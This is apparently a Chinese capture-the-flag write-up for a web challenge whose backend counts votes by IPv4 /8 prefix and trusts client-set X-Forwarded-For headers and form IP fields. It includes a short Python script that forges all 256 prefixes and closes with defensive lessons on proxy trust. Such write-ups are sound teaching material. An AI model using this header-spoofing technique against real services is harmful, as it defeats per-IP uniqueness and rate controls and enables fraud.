# FLAG 助力大红包

## 题目简述

网页按访问者 IPv4 地址的 `/8` 网段统计助力，同一个首字节只能贡献一次。奖励函数为：

$$
r=-0.0000076(c-256)^2+1
$$

其中 $c$ 是已收集的不同 `/8` 数量。要取得完整奖励必须让 $c=256$。现实网络无法提供全部首字节，但后端同时信任表单中的 `ip` 和客户端可控的 `X-Forwarded-For`，因此可伪造来源地址。

## 解题过程

先观察请求可知，助力接口把请求中的 IP 字符串交给后端解析，并只取第一个八位组作为集合键。反向代理头 `X-Forwarded-For` 本应由可信代理写入；应用却没有限制直连客户端设置该头，从而把身份边界交给了用户输入。

依次伪造 256 个首字节即可：

```python
import time
import requests

session = requests.Session()
session.get("https://challenge.example/?token=YOUR_TOKEN")

for first_octet in range(256):
    fake_ip = f"{first_octet}.1.1.1"
    response = session.post(
        "https://challenge.example/help",
        data={"ip": fake_ip},
        headers={"X-Forwarded-For": fake_ip},
    )
    response.raise_for_status()
    time.sleep(1.2)
```

这里的 URL 是接口占位符，实际复现时从浏览器 Network 面板复制题目接口和会话。延时用于适配题目的令牌桶限速；请求过快会被拒绝，并不是伪造失败。

当集合包含从 `0` 到 `255` 的全部首字节后，$c=256$，二次项归零，奖励达到 1，服务端返回账号相关的 flag。

## 方法总结

- 核心技巧：利用后端无条件信任 `X-Forwarded-For`，伪造全部 IPv4 `/8` 身份。
- 识别信号：业务逻辑按来源 IP 做唯一性校验，而应用层能直接看到或接收代理头、表单 IP 字段。
- 复用要点：只有受信任反向代理才能覆盖客户端来源；应用应丢弃外部传入的转发头，并从固定代理链中提取地址。自动化时还要尊重服务端限速和会话状态。
